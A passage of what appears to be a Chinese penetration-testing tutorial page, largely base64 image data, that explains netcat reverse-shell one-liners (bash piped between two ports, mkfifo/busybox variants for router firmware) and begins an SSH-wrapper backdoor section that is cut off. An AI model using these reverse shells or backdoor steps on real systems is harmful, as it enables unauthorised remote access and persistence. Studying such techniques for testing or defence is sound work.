Rs/dPtiXxidUwtoNKi7pPMm123etZBxaypeYXBt9dF36iGfkQVsDoTr3RXfJeTx/u7UUYOVc4HMqItopV69wUcIW1MDg2GmKyHLuvkCDAZQRdJvYHLuhn8cR9SqI0k8syOIpwtrQf8IrdSs4NKvHlMPykwsDi7TAPhuWOBArx5SyFDZzr4tCBp2sXf6Eao9yniZ0KIM2ArXY1REaAbK513wfzEhtTbb79xGf6A/jd1OAfeJFcBaKpjGL3ll3VJBkNgU3vI4nsD8t5qufw75SHTISnj6K0zznquR2GcDhW2RhpgoAAjAKT4xSHQtPfbAHNZI4DCxzozOZ+xXiga7ESb0IWRlGJ1ACJd5xW1PFDmJ3hJ/x29NA7FBk4QratW1oQld+Xgy253iQ60gMfMeRhYJ+jttekAOerMqp57b8Yzdt5sDNbWz/HVuLf6lz/1T41DJQtEtJLsXE4dyemhEOs5LSxoWz5koTS/YZHftRZKGITLqocJOZWcNoUcm0MWI8XAfnqr3NgRmJV+YWUkJRnhpCATM+23V/F/R++EyK4r/oRVNhSiKAvf4/Jf53oNcmoJTR9UJdBu8ToQ2dy9tgaQPRhIv1F3PEZwfkwoAi5eoyONGr1r8G2QfGP09UYpL70vaspWOjkuGtMCinlBpIoR0CCyOcqO2t9XM6p9o50DMnvK92nVUz1nMGj09Zn6+8IPlYHnjQl8Y0k3A/51I9mnekMUtIdSwXuLPPhzv/HV5bZVbajP9uKRSyLtdXIIQ5anAxR4lgj5/yB6xLLANNJ2GsMcd4sUecjtjfeURaJuMVXGu6LOqQ3mFGa5YO0nnIAdO39iTZ7dSu2F7hw4BY7qxtmJ1qZeFbgYlJ0wFm4e5Ipu0duUYRGYi5RZONTK7SGdfhIpkUJTUKYaQ/6beVeHP5aelPt5M1A+czkGI6monx0ec2hpUjROoos6DBsRYap7JgRV4X2CzitY9ti/ZpxL5DUVO5J5z8i1K2oSopyYdr/3Rrx1uBznAnYVngU+oW0P412ezSbP5igCwe0wFZrG+G23orvoT97c5ayD2YQwoYnJDi5O7uSTpxE2Mcj38WD2i4Q8MOH3vZ6A3CSbqbvaIoWpWa+g+P6lINY6Bb4JHoQ8/LPHWkpf+TQ3ed8Y/WFiXdHG0lhKoy5Uvzm+KNXEQyfVsnfoTqJbuyj9KonAXXqETcnn6rfPMTVzKR3hHtZxtDUfwTEhb/a3v1VqWYKnP9Mho0PP9A7Sbd2ziKCxcJF1jg0rCpaKEzatzN2EXypIyAF5SqJv0k17TUpHvd/ghUJtjxlxWTGGSKpxb2NyVt7eGD3pe5WVwDPlSLH5jqxitBev/bI1AAxvpiIVWqdMzPSuG32wFxNejt/swW82Isn9epnafvUaBIcUz6WStACjbeS11DWxUEQmF+NtcULz7dFQjeBkV0GtP4w2bVH4Y6iRC5bplZ9GufYDSO8ID7xAQMrScALRw4JQdu6lOezCJ01E/4ANIHaZz9kEsVl868NGIlt/Asp259EAbn4QhFnDljtNgc5LPlzpb5QPHiQJEqeDNY+vTne3fxWWnAwCHsqc1ZPM2J9v6IMUcOKHFTzznoChsLVQOrV7+0s12aNzUYUCdhEtBbmB6wCQvWUTNkCLS+h0D2ZbYxk1iV3/OwB5d/OJHhO5nRT1j7rO0xWWK8ZQki6PztE/4goeqeTRmVVvb9CnJecVSPl5bteJ7eKZJxQRzGYmUU/JUjq5F+rRAcmCekpeGKbFMmNp8aDUvdrTHHWBZbw6qO9PrX2CEvT/Q6PKzHzSkxK0FIv2B5kieaXsAAbaUxNEiTgCuxQcLiGH2vvNwTL4efSlPzFbMX03eCcfNErIMN8ihtARImYyAAAAAAA=" width="1080" height="95" class="img_ev3q"></p>
<p>**优点：**直接反弹，没有多余的符号。</p>
<p>**缺点：**系统apt默认安装的都是不提供反向链接的版本，需要自己上传编译后的二进制版本。</p>
<p>解决方法1:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">6666</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/bin/bash</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">7777</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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" width="1080" height="98" class="img_ev3q"></p>
<p>利用6666端口传入内容交给bash执行，再将内容从7777送出去，管道符的用法。可以在阉割功能的nc上使用。</p>
<p>解决方法2: (针对某些mips架构的路由器&amp;busybox终端的系统)：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 锐捷</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mkfifo</span><span class="token plain"> /tmp/backpipe1 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> /bin/sh </span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/tmp/backpipe1 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">6666</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:#393A34">1</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/tmp/backpipe1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 飞鱼星反弹shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mkfifo</span><span class="token plain"> /tmp/backpipe1 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> /bin/sh </span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">/tmp/backpipe1 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> /bin/busybox </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">6666</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:#393A34">1</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/tmp/backpipe1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823657479487222131-a33b27ce334f0a37fcea1ef614ea35d0.jpg" width="1080" height="260" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ssh后门">SSH后门<a href="#ssh后门" class="hash-link" aria-label="SSH后门的直接链接" title="SSH后门的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-wrapper">SSH wrapper<a href="#ssh-wrapper" class="hash-link" aria-label="SSH wrapper的直接链接" title="SSH wrapper的直接链接">​</a></h3>
<p>判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">cd</span><span class="token plain"> /usr/sbin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> sshd </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/bin</span><br></span><span 